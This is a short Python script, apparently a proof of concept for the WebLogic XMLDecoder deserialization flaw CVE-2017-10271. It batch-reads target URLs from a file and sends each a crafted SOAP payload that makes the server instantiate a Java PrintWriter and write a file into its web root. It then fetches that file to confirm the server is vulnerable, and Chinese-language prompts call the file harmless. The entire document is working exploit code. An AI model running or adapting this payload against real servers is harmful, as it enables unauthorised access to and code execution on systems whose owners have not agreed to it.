import requests
import time
import sys
headers = {
    'Accept-Encoding':'gzip, deflate',
    'Accept':'*/*',
    'Accept-Language':'en',
    'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
    'Connection':'close',
    'Content-Type':'text/xml',
    'Content-Type':'text/xml'
    }
def Webogic_XMLDecoder_poc(url):
    posturl=url+'/wls-wsat/CoordinatorPortType'
    geturl=url+'/bea_wls_internal/test.txt'
    data='''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.txt</string>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''
    requests.post(posturl,data,headers=headers)
    time.sleep(1)
    resget=requests.get(geturl)
    if resget.status_code == 200:
        print(url+":存在CVE-2017-10271漏洞")
    else:
        print(url+":不存在CVE-2017-10271漏洞")
if __name__ == '__main__':
    Tips=input("本程序运行时会在服务器生成无恶意文件,是否继续，继续输入Y:")
    if Tips == "Y":
        filetxt=open('url.txt')
        for url in filetxt:
            Webogic_XMLDecoder_poc(url)
    print("生成的无恶意文件存放在/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.txt位置")
    time.sleep(5)